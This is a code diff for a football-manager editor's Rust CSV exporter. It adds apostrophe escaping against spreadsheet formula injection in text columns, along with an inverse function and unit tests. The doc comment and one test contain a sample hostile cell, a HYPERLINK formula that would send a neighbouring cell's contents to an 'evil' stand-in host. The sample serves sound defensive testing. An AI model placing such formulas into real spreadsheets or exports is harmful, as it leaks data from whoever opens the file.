@@ -16,6 +16,23 @@
 //! An empty cell always means "omitted", never "zero" or "empty string" — it is
 //! how a package says *let the engine decide*, matching how the editor's forms
 //! already treat blank fields.
+//!
+//! # Formula escaping
+//!
+//! Spreadsheets execute any cell whose text begins with `=`, `+`, `-` or `@`.
+//! Package text is free-form and may come from a package someone else authored,
+//! so a club named `=HYPERLINK("http://evil/?x="&A1,"FC")` would stop being a
+//! name and start being a live formula the moment the file is opened. `.ofm` is
+//! a *data* format — installing a package must not be able to run anything — so
+//! the export escapes those cells rather than handing a spreadsheet code.
+//!
+//! The escape is a leading apostrophe, which spreadsheets consume as a
+//! "treat as text" marker. It is applied to **text columns only**: `financeMin`
+//! is an `i64` and a club in debt legitimately exports `-2000000`, which must
+//! stay a number the author can sort and total, not become text.
+//!
+//! Escaping is defined as a reversible pair so a future importer can undo it
+//! exactly. See [`escape_formula`] for the rule and its inverse.
 
 use std::path::Path;
 
@@ -40,6 +57,23 @@ const TEAM_HEADERS: &[&str] = &[
     "logo",
 ];
 
+/// Team columns holding free text, and so eligible for formula escaping. The
+/// four range columns are numbers and are deliberately absent: escaping them
+/// would turn a negative `financeMin` into text in the spreadsheet.
+const TEAM_TEXT_HEADERS: &[&str] = &[
+    "id",
+    "name",
+    "shortName",
+    "city",
+    "country",
+    "playStyle",
+    "stadiumName",
+    "primaryColor",
+    "secondaryColor",
+    "kitPattern",
+    "logo",
+];
+
 const PLAYER_IDENTITY_HEADERS: &[&str] = &[
     "id",
     "firstName",
@@ -54,6 +88,22 @@ const PLAYER_IDENTITY_HEADERS: &[&str] = &[
     "youth",
     "photo",
     "overall",
+];
+
+/// Player columns holding free text. `age` and `overall` are numbers, as is
+/// every attribute column, so none of them appear here.
+const PLAYER_TEXT_HEADERS: &[&str] = &[
+    "id",
+    "firstName",
+    "lastName",
+    "name",
+    "club",
+    "nationality",
+    "position",
+    "dateOfBirth",
+    "footedness",
+    "youth",
+    "photo",
 ];
 
 /// The 19 attribute columns, in the order [`PlayerAttributes`] declares them:
@@ -106,6 +156,37 @@ fn attribute_values(attributes: &PlayerAttributes) -> Vec<String> {
 
 fn optional<T: ToString>(value: &Option<T>) -> String {
     value.as_ref().map(ToString::to_string).unwrap_or_default()
+}
+
+/// Characters that make a spreadsheet read a cell as a formula rather than text.
+const FORMULA_LEAD: [char; 4] = ['=', '+', '-', '@'];
+
+/// Prefix an apostrophe to a text cell a spreadsheet would otherwise execute.
+///
+/// The test is applied to the cell *with its leading apostrophes removed*, which
+/// is what makes the transform reversible: a value the author really did write
+/// as `'=x` is escaped to `''=x`, so dropping one apostrophe on import always
+/// returns exactly what was authored. The inverse an importer must apply is
+///
+/// ```ignore
+/// fn unescape_formula(cell: &str) -> &str {
+///     let bare = cell.trim_start_matches('\'');
+///     if cell.len() > bare.len() && bare.starts_with(FORMULA_LEAD) {
+///         &cell[1..]
+///     } else {
+///         cell
+///     }
+/// }
+/// ```
+///
+/// A cell with no leading apostrophe, or one whose apostrophes are part of the
+/// author's own text (`'tis`), is left alone by both directions.
+fn escape_formula(cell: String) -> String {
+    if cell.trim_start_matches('\'').starts_with(FORMULA_LEAD) {
+        format!("'{cell}")
+    } else {
+        cell
+    }
 }
 
 /// Render an enum the way serde writes it into the package JSON, so the column
@@ -183,15 +264,38 @@ fn player_row(player: &PlayerDef) -> Vec<String> {
     row
 }
 
-fn write_csv(output: &str, headers: &[&str], rows: Vec<Vec<String>>) -> Result<(), String> {
+/// Write `rows` under `headers`, escaping formulas in the columns named by
+/// `text_headers`.
+///
+/// The headers themselves are fixed ASCII identifiers declared above, so they
+/// are written as-is; only package-controlled cells can carry a formula.
+fn write_csv(
+    output: &str,
+    headers: &[&str],
+    text_headers: &[&str],
+    rows: Vec<Vec<String>>,
+) -> Result<(), String> {
+    let is_text: Vec<bool> = headers.iter().map(|h| text_headers.contains(h)).collect();
+
     let mut writer =
         csv::Writer::from_path(Path::new(output)).map_err(|_| "be.error.csv.writeFailed".to_string())?;
     writer
         .write_record(headers)
         .map_err(|_| "be.error.csv.writeFailed".to_string())?;
     for row in rows {
+        let escaped: Vec<String> = row
+            .into_iter()
+            .enumerate()
+            .map(|(i, cell)| {
+                if is_text.get(i).copied().unwrap_or(false) {
+                    escape_formula(cell)
+                } else {
+                    cell
+                }
+            })
+            .collect();
         writer
-            .write_record(&row)
+            .write_record(&escaped)
             .map_err(|_| "be.error.csv.writeFailed".to_string())?;
     }
     writer
@@ -202,7 +306,12 @@ fn write_csv(output: &str, headers: &[&str], rows: Vec<Vec<String>>) -> Result<(
 /// Write the package's teams to `output` as CSV.
 #[tauri::command]
 pub fn export_teams_csv(teams: Vec<TeamDef>, output: String) -> Result<(), String> {
-    write_csv(&output, TEAM_HEADERS, teams.iter().map(team_row).collect())
+    write_csv(
+        &output,
+        TEAM_HEADERS,
+        TEAM_TEXT_HEADERS,
+        teams.iter().map(team_row).collect(),
+    )
 }
 
 /// Write the package's players to `output` as CSV. Youth and first-team players
@@ -214,7 +323,12 @@ pub fn export_players_csv(players: Vec<PlayerDef>, output: String) -> Result<(),
         .chain(PLAYER_ATTRIBUTE_HEADERS)
         .copied()
         .collect();
-    write_csv(&output, &headers, players.iter().map(player_row).collect())
+    write_csv(
+        &output,
+        &headers,
+        PLAYER_TEXT_HEADERS,
+        players.iter().map(player_row).collect(),
+    )
 }
 
 #[cfg(test)]
@@ -352,5 +466,107 @@ mod tests {
         let record = reader.records().next().expect("one row").expect("valid row");
         assert_eq!(&record[1], r#"Preston "North End", Lancashire"#);
         assert_eq!(&record[2], "TST", "the comma must not shift later columns");
+    }
+
+    /// The inverse documented on [`escape_formula`], which the future importer
+    /// will apply. Kept here so the pair is proven to round-trip before any
+    /// reader depends on it.
+    fn unescape_formula(cell: &str) -> &str {
+        let bare = cell.trim_start_matches('\'');
+        if cell.len() > bare.len() && bare.starts_with(FORMULA_LEAD) {
+            &cell[1..]
+        } else {
+            cell
+        }
+    }
+
+    #[test]
+    fn every_declared_text_column_is_a_real_column() {
+        // A typo here would silently leave a column unescaped, so pin the text
+        // lists to the header lists rather than trusting they stay in step.
+        for header in TEAM_TEXT_HEADERS {
+            assert!(TEAM_HEADERS.contains(header), "unknown team column {header}");
+        }
+        let player_headers: Vec<&str> = PLAYER_IDENTITY_HEADERS
+            .iter()
+            .chain(PLAYER_ATTRIBUTE_HEADERS)
+            .copied()
+            .collect();
+        for header in PLAYER_TEXT_HEADERS {
+            assert!(player_headers.contains(header), "unknown player column {header}");
+        }
+    }
+
+    #[test]
+    fn a_formula_in_a_name_is_neutralised() {
+        let dir = tempfile::tempdir().expect("temp dir");
+        let path = dir.path().join("teams.csv");
+
+        let hostile = r#"=HYPERLINK("http://evil.example/?x="&A1,"FC")"#;
+        export_teams_csv(
+            vec![team_def(base_team(hostile))],
+            path.to_string_lossy().to_string(),
+        )
+        .expect("export should succeed");
+
+        let mut reader = csv::Reader::from_path(&path).expect("written file should parse");
+        let record = reader.records().next().expect("one row").expect("valid row");
+        assert_eq!(&record[1], format!("'{hostile}"), "a spreadsheet would execute this");
+        assert_eq!(unescape_formula(&record[1]), hostile, "and it must survive import");
+    }
+
+    #[test]
+    fn negative_numbers_are_left_as_numbers() {
+        // The reason escaping is scoped to text columns: a club in debt exports
+        // a negative financeMin, and prefixing it would make the column text —
+        // unsortable and un-summable in exactly the tool it is exported for.
+        let dir = tempfile::tempdir().expect("temp dir");
+        let path = dir.path().join("teams.csv");
+
+        let mut json = base_team("FC Test");
+        json["financeRange"] = serde_json::json!([-2_000_000i64, -1_000_000i64]);
+        export_teams_csv(
+            vec![team_def(json)],
+            path.to_string_lossy().to_string(),
+        )
+        .expect("export should succeed");
+
+        let mut reader = csv::Reader::from_path(&path).expect("written file should parse");
+        let record = reader.records().next().expect("one row").expect("valid row");
+        assert_eq!(&record[11], "-2000000");
+        assert_eq!(&record[12], "-1000000");
+    }
+
+    #[test]
+    fn escaping_round_trips_for_every_shape_of_cell() {
+        for original in [
+            "Preston North End",   // ordinary text, untouched
+            "=1+1",                // formula
+            "+44",                 // phone-like
+            "-Rangers",            // leading dash
+            "@here",               // mention
+            "'=already",           // the author's own apostrophe
+            "''=doubled",
+            "'tis",                // apostrophe that isn't an escape
+            "",
+        ] {
+            let escaped = escape_formula(original.to_string());
+            assert_eq!(
+                unescape_formula(&escaped),
+                original,
+                "{original:?} did not survive the escape/unescape pair"
+            );
+        }
+    }
+
+    #[test]
+    fn only_formula_leads_are_prefixed() {
+        assert_eq!(escape_formula("=1+1".to_string()), "'=1+1");
+        assert_eq!(escape_formula("'=1+1".to_string()), "''=1+1");
+        // Nothing else is touched — escaping ordinary names would be visible
+        // noise in every cell of the file.
+        assert_eq!(escape_formula("Preston".to_string()), "Preston");
+        assert_eq!(escape_formula("'tis".to_string()), "'tis");
+        assert_eq!(escape_formula(String::new()), "");
     }
 }
